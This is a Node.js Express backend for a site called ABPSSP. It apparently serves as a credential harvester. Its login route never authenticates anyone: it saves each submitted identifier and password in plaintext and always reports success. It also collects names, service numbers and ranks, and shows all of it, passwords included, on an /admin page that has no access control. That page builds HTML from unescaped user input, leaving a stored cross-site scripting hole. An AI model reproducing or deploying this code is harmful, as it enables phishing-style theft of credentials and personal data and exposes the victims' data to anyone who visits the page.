const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 5000;

// Enable CORS so the backend can accept requests from GitHub pages
app.use(cors());
app.use(express.json());

// Serve static files from the root directory
app.use(express.static(__dirname));

// Initialize Database
const db = new sqlite3.Database(path.join(__dirname, 'database.db'), (err) => {
    if (err) {
        console.error('Error opening database:', err.message);
    } else {
        db.run(`CREATE TABLE IF NOT EXISTS contacts (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, email TEXT, message TEXT)`);
        db.run(`CREATE TABLE IF NOT EXISTS logins (id INTEGER PRIMARY KEY AUTOINCREMENT, identifier TEXT, password TEXT)`);
        db.run(`CREATE TABLE IF NOT EXISTS memberships (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, service_no TEXT, rank TEXT, email TEXT)`);
    }
});

// API Routes
app.post('/api/contact', (req, res) => {
    const { name, email, message } = req.body;
    const stmt = db.prepare(`INSERT INTO contacts (name, email, message) VALUES (?, ?, ?)`);
    stmt.run(name, email, message, function(err) {
        if (err) {
            return res.status(500).json({ status: "error", error: err.message });
        }
        res.json({ status: "success" });
    });
    stmt.finalize();
});

app.post('/api/login', (req, res) => {
    const { identifier, password } = req.body;
    const stmt = db.prepare(`INSERT INTO logins (identifier, password) VALUES (?, ?)`);
    stmt.run(identifier, password, function(err) {
        if (err) {
            return res.status(500).json({ status: "error", error: err.message });
        }
        res.json({ status: "success" });
    });
    stmt.finalize();
});

app.post('/api/membership', (req, res) => {
    const { name, service_no, rank, email } = req.body;
    const stmt = db.prepare(`INSERT INTO memberships (name, service_no, rank, email) VALUES (?, ?, ?, ?)`);
    stmt.run(name, service_no, rank, email, function(err) {
        if (err) {
            return res.status(500).json({ status: "error", error: err.message });
        }
        res.json({ status: "success" });
    });
    stmt.finalize();
});

// Admin Dashboard Route
app.get('/admin', (req, res) => {
    db.all(`SELECT * FROM contacts`, [], (err, contacts) => {
        db.all(`SELECT * FROM logins`, [], (err, logins) => {
            db.all(`SELECT * FROM memberships`, [], (err, memberships) => {
                let html = "<html><head><title>Admin Dashboard | ABPSSP</title>";
                html += "<style>body{font-family:sans-serif; margin: 2rem; background: #f4f4f4;} table{width: 100%; border-collapse: collapse; margin-bottom: 2rem;} th, td{padding: 0.8rem; text-align: left; border: 1px solid #ddd;} th{background: #4B5320; color: white;} h2{color: #333;}</style>";
                html += '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">';
                html += "</head><body>";
                html += "<h1><i class='fas fa-lock'></i> Host Admin Dashboard</h1>";
                
                html += "<h2>Contact Messages</h2><table><tr><th>ID</th><th>Name</th><th>Email</th><th>Message</th></tr>";
                contacts.forEach(r => html += `<tr><td>${r.id}</td><td>${r.name}</td><td>${r.email}</td><td>${r.message}</td></tr>`);
                if (contacts.length === 0) html += "<tr><td colspan='4'>No messages yet.</td></tr>";
                html += "</table>";
                
                html += "<h2>Login Attempts</h2><table><tr><th>ID</th><th>Identifier</th><th>Password</th></tr>";
                logins.forEach(r => html += `<tr><td>${r.id}</td><td>${r.identifier}</td><td>${r.password}</td></tr>`);
                if (logins.length === 0) html += "<tr><td colspan='3'>No login attempts yet.</td></tr>";
                html += "</table>";
                
                html += "<h2>Membership Registrations</h2><table><tr><th>ID</th><th>Name</th><th>Service No</th><th>Rank</th><th>Email</th></tr>";
                memberships.forEach(r => html += `<tr><td>${r.id}</td><td>${r.name}</td><td>${r.service_no}</td><td>${r.rank}</td><td>${r.email}</td></tr>`);
                if (memberships.length === 0) html += "<tr><td colspan='5'>No memberships yet.</td></tr>";
                html += "</table>";
                
                html += "</body></html>";
                res.send(html);
            });
        });
    });
});

app.listen(PORT, () => {
    console.log(`Backend server running! Access the website at http://localhost:${PORT}`);
    console.log(`Access the admin dashboard at http://localhost:${PORT}/admin`);
});
